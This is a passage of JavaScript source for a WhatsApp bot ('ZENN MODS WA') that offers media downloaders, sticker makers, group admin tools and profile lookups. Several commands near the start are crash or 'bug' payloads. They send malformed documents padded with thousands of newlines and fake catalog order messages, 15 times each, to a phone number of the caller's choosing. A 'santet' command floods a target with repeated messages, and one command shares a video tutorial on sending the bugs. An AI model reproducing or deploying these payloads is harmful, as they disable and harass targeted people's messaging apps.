n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ZENN MODS WA ${buttonkal}`,
}

}), { userJid: from, quoted:kalgans})
haikal.relayMessage(from, document.message, { messageId: document.key.id })
}
await sleep(2000)
}
break
//=================================================//
case 'unlitroli': {
if (!isCreator) return m.reply(`*khusus Premium*`)
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": 'ZENN MODS WA',
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : kalgans})
haikal.relayMessage(from, order.message, { messageId: order.key.id })
}
await sleep(2000)
}
break
//=================================================//
case 'sendunlidocu': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `ZENN MODS WA⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ZENN MODS WA ${buttonkal}`,
}

}), { userJid: from, quoted:kalgans})
haikal.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
await sleep(2000)
}
break
//=================================================//
case 'sendunlitroli': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": 'ZENN MODS WA',
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : hw})
haikal.relayMessage(bnnd, order.message, { messageId: order.key.id })
}
await sleep(2000)
}
break
case 'santet' : {
 if (!isCreator) return m.reply(`*khusus Premium*`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
haikal.sendMessage(Pe, {text: 'ZENN MODS WA'}, {quoted:kalgans})
await sleep(2000)
}
break
//=================================================//
case 'tutorialbug': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
joauuuu = fs.readFileSync('./baseikal/video/tutor.mp4')
haikal.sendMessage(from, { video: joauuuu, mimetype: 'video/mp4', caption: `TUTORIAL SEND BUG UNLIMITED PAKE ID GROUP ` }, {quoted : hw})
}
break
//=================================================//
case 'haikal': {
if (!isCreator) return m.reply(`*khusus Premium*`)
joauu = fs.readFileSync('./baseikal/video/hwmods.mp4')
haikal.sendMessage(from, { video: joauu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI KHUSUS ANDROID 11 KEBAWAH DENG ` }, {quoted:kalgans})
}
break
//=================================================//
case 'goyang': {
if (!isCreator) return m.reply(`*khusus Premium*`)
joauuuuu = fs.readFileSync('./baseikal/video/hwmods2.mp4')
haikal.sendMessage(from, { video: joauuuuu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI KHUSUS ANDROID 11 KEBAWAH DENG ` }, {quoted:kalgans})
}
break
//=================================================//
case 'apkamgeekz': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
joauuu = fs.readFileSync('./baseikal/apk/amgeekz.apk')
haikal.sendMessage(from, { document: joauuu, mimetype: "application/vnd.android.package-archive", fileName: `AMGEEKZ.apk`, title:`AMGEEKZ.apk`, caption:`Apk Amgeekz ` }, {quoted : hw})
}
break
//=================================================//
case 'pembayaran': case 'nope': case 'listpayment':{
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Pembayaran Silahkan Klick Link Di Bawah Yah : 

https://bit.ly/3Mw6t30

Terima Kasih`)
}
break
//=================================================//
case "githubstalk":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) return m.reply(`Contoh ${prefix+command} HW-XMTeam`)
m.reply('*Sabar Cuy Loading*')
aj = await stalkgh(`${text}`)
haikal.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: `
[ *Stalking Github* ]

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted : hw } )
}
break
//=================================================//
case "ffstalk":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!text) return m.reply('nama ig nya apa cuy')
m.reply('*Sabar Cuy Loading*')
eeh = await stalkff(`${text}`)
m.reply(`[ *Stalking Freefire* ]

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
//=================================================//
case "mlstalk": {
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!text) return m.reply(`Contoh ${prefix+command} 530793138|8129`)
m.reply('*Sabar Cuy Loading*')
let dat = await stalkml(text.split("|")[0], text.split("|")[1])
m.reply(`[ *Stalking Mobile Legend* ]

Username : ${dat.userName}
Id : ${text.split("|")[0]}
Zoneid : ${text.split("|")[1]}`)
}
break
//=================================================//
case "igstalk":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!text) return m.reply('id nya apa cuy')
m.reply('*Sabar Cuy Loading*')
aj = await stalkig(`${text}`)
haikal.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`[ *Stalking Instagram* ]

Fullname : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted : hw } )
}
break
//=================================================//
case "fbvideo": case "fbreels":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!text) return m.reply('Link nya kak?\n\nContoh : .facebook https://www.facebook.com/reel/478437244198357')
m.reply('*Sabar Cuy Loading*')
let res = await facebook(text)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted : hw})
}
break
//=================================================//
case "igvideo": case "igreels":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!text) return m.reply('Link nya kak?\n\nContoh : .instagram https://www.instagram.com/tv/CEjIHlnpyvI/?igshid=NTdlMDg3MTY=')
m.reply('*Sabar Cuy Loading*')
let res = await instagram(text)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted : hw})
}
break
//=================================================//
case "twitvideo":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!text) return m.reply('Link nya kak?\n\nContoh : .twitter https://twitter.com/FCBarcelona_es/status/1615392117026586628?s=20&t=Djtl01fwdxTX1I5g-tm72A')
m.reply('*Sabar Cuy Loading*')
let res = await twitter(text)
let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted : hw})
}
break
//=================================================//
case "tiktokvideo":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) return m.reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
m.reply('*Sabar Cuy Loading*')
let res = await tiktok(text)
haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
caption: `
辛 Url :  ${text}`}, {quoted : hw})
}
break
//=================================================//
case "tiktokaudio":{
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) return m.reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
m.reply('*Sabar Cuy Loading*')
let res = await tiktok(text)
let ghd = await haikal.sendMessage(from,{audio:{url: res.url[1].url}, mimetype: "audio/mp4", ptt:false, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281214281312',
title: `ZENN MODS WA`,
sourceUrl: `https://wa.me/6281214281312`, 
thumbnail: thumb
}
}})
}
break
//=================================================//
case 'ytvn': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
 let { ytv } = require('./baseikal/lib/y2mate')
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
haikal.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mp4', ptt: true, fileName: `${media.title}.mp3`, caption: `✇ Title : ${media.title}\n✇ File Size : ${media.filesizeF}\n✇ Url : ${isUrl(text)}\n✇ Ext : MP3\n✇ Resolusi : ${args[1] || '360p'}`, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281214281312',
title: `ZENN MODS WA`,
sourceUrl: `https://wa.me/6281214281312`, 
thumbnail: thumb
}
}})
}
break
//=================================================//
case 'ytmp4': case 'ytvideo': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
 let { ytv } = require('./baseikal/lib/y2mate')
 let quality = args[1] ? args[1] : '360p'
 let media = await ytv(text, quality)
 if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
 haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `Ketik Tovn Dan Reply Video Untuk Menjadikan Voice/Vn 
- Tovn
- Toaud` }, {quoted : hw})
}
break
//=================================================//
case 'wm': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let teks = `${text}`
{
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(from, media, m, { packname: `${teks}`, author: `${teks}` })
await fs.unlinkSync(encmedia)
}
}
}
break
case 'wmvideo':{
if (isBan) return m.reply('*Lu Di Ban Owner*')
let teks = `${text}`
{
 if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(from, media, m, { packname: `${teks}`, author: `${teks}` })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
}
break
//=================================================//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'smeme':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) throw `Balas Image Dengan Caption ${prefix + command}`
if (!quoted) throw `Balas Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
m.reply('*Sabar Cuy Loading*')
mee = await haikal.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
haikal.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
}
break
//=================================================
case 'toimage': case 'toimg': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(from, { image: buffer }, {quoted : hw})
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!quoted) throw `Balas sticker video Dengan Caption ${prefix + command}`
if (/video/.test(mime)) {
let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, {quoted : hw})
await fs.unlinkSync(media)
}
}
break
case 'tomp3': {
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await haikal.downloadMediaMessage(quoted)
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${haikal.user.name}.mp3`}, { quoted : m })
}
break
//=================================================//
case 'toaud': case 'audio': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await haikal.downloadMediaMessage(quoted)
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
//=================================================//
case 'tovn': case 'voice': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
m.reply('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281214281312',
title: `ZENN MODS WA`,
sourceUrl: `https://wa.me/6281214281312`, 
thumbnail: thumb
}
}})
}
break
//=================================================//
case 'togif': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted : hw})
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//=================================================//
case "quotes":
if (isBan) return m.reply('*Lu Di Ban Owner*')
 var resi = await Quotes()
teks = `\nAuthor: ${resi.author}\n`
teks = `\nQuotes:\n`
teks = `${resi.quotes}\n`
reply(teks)
break
//=================================================//
case 'linkgroup': case 'linkgc': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
let response = await haikal.groupInviteCode(from)
haikal.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'resetlinkgc':
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
haikal.groupRevokeInvite(from)
break
//=================================================//
case 'sendlinkgc': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await haikal.groupInviteCode(from)
haikal.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break
//=================================================//
case 'kick': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'remove')
}
break
//=================================================//
case 'add': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'add')
}
break
//=================================================//
case 'promote': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'promote')
}
break
//=================================================//
case 'demote': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'demote')
}
break
//=================================================//
case 'hidetag': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted : hw})
}
break
//=================================================//
case 'setcmd': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.quoted) throw 'Reply Pesan!'
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let teks = `
*List Cmd Sticker*
${Object.entries(global.db.data.sticker).map(([key, value], index) => `True : ${value.text}`).join('\n')}
`.trim()
haikal.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4':
case 'attp':
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (args.length == 0) return reply(`Example: ${prefix + command} Znxn Xyz`)
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
haikal.sendMessage(from, { sticker : ini_buffer }, { quoted :hw })
break
//=================================================//
case  'qc':{
if (isBan) return m.reply('*Lu Di Ban Owner*')
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await haikal.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await haikal.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
haikal.sendMessage(from,{image: buffer},{quoted : hw})
})
}
